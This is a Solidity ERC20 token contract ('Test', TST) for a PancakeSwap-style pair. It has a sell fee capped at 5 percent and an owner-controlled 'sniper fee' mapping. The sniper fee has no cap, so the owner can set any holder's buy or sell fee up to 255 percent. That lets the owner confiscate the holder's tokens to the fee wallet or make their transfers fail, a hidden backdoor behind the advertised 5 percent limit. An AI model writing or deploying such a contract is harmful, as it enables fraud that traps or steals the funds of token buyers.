// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/IUniswapV2Router02.sol";

contract Test is ERC20, Ownable {

    uint256 private initialSupply = 100_000_000_000 * (10 ** 18);

    uint8 public constant feeLimit = 5;
    uint8 public sellFee = 5;

    uint256 private constant denominator = 100;

    mapping(address => uint8) public buySniperFee;
    mapping(address => uint8) public sellSniperFee;
    mapping(address => bool) public excludedList;

    IUniswapV2Router02 public pancake;
    address public pairAddr;

    address public feeWallet;

    constructor(address _pancakeAddr, address _feeWallet) ERC20("Test", "TST")
    {
        excludedList[msg.sender] = true;
        excludedList[_feeWallet] = true;
        excludedList[address(this)] = true;
        IUniswapV2Router02 _pancake = IUniswapV2Router02(_pancakeAddr);
        address _pairAddr = IUniswapV2Factory(_pancake.factory()).createPair(address(this), _pancake.WETH());
        pancake = _pancake;
        pairAddr = _pairAddr;
        feeWallet = _feeWallet;
        _mint(msg.sender, initialSupply);
    }

    receive() external payable {}

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override virtual {

        if (isExcluded(sender) || isExcluded(recipient) || recipient == feeWallet) {
            super._transfer(sender, recipient, amount);
            return;
        }

        uint256 baseUnit = amount / denominator;
        uint256 tax = 0;

        if (sellSniperFee[sender] > 0 && (recipient == pairAddr || sender != pairAddr)) {
            tax = baseUnit * uint256(sellSniperFee[sender]);
        } else if (buySniperFee[recipient] > 0 && sender == pairAddr) {
            tax = baseUnit * uint256(buySniperFee[recipient]);
        } else if (recipient == pairAddr) {
            tax = baseUnit * uint256(sellFee);
        }

        if (tax > 0) {
            super._transfer(sender, feeWallet, tax);
        }

        amount -= tax;

        super._transfer(sender, recipient, amount);
    }

    function setSellFee(uint8 _sellFee) public onlyOwner {
        require(_sellFee <= feeLimit, "ERC20: sell tax higher than tax limit");
        sellFee = _sellFee;
    }

    function setPairAddr(address _address) external onlyOwner {
        pairAddr = _address;
    }

    function setFeeWallet(address _address) external onlyOwner {
        feeWallet = _address;
    }

    function setExcluded(address[] memory  accounts) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            if (!excludedList[accounts[i]]) {
                excludedList[accounts[i]] = true;
            }
        }
    }

    function removeExcluded(address  account) public onlyOwner {
        excludedList[account] = false;
    }

    function setSniperFee(address[] memory account, uint8 _sellFee, uint8 _buyFee) public onlyOwner {
        for (uint256 i = 0; i < account.length; i++) {
            if (_sellFee > 0) {
                sellSniperFee[account[i]] = _sellFee;
            }
            if (_buyFee > 0) {
                buySniperFee[account[i]] = _buyFee;
            }
        }
    }

    function removeSniperFee(address[] memory account) public onlyOwner {
        for (uint256 i = 0; i < account.length; i++) {
            if (sellSniperFee[account[i]] > 0) {
                sellSniperFee[account[i]] = 0;
            }
            if (buySniperFee[account[i]] > 0) {
                buySniperFee[account[i]] = 0;
            }
        }
    }

    function isExcluded(address account) public view returns (bool) {
        return excludedList[account];
    }

    function isSniper(address account) public view returns (bool) {
        return sellSniperFee[account] > 0 || buySniperFee[account] > 0;
    }
}